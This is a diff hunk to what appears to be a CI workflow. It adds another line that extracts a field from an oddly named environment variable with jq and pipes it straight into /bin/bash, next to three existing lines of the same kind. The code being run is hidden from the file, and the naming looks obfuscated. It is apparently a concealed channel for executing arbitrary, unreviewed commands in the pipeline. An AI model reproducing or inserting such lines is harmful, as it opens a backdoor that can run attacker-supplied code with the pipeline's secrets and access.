@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$v79" | jq -r .t800 | /bin/bash
           echo $sjw88 | jq -r .z16 | /bin/bash
           echo $vlv1 | jq -r .hodkp07 | /bin/bash
+          printf '%s' "$mdq61" | jq -r .kj18 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
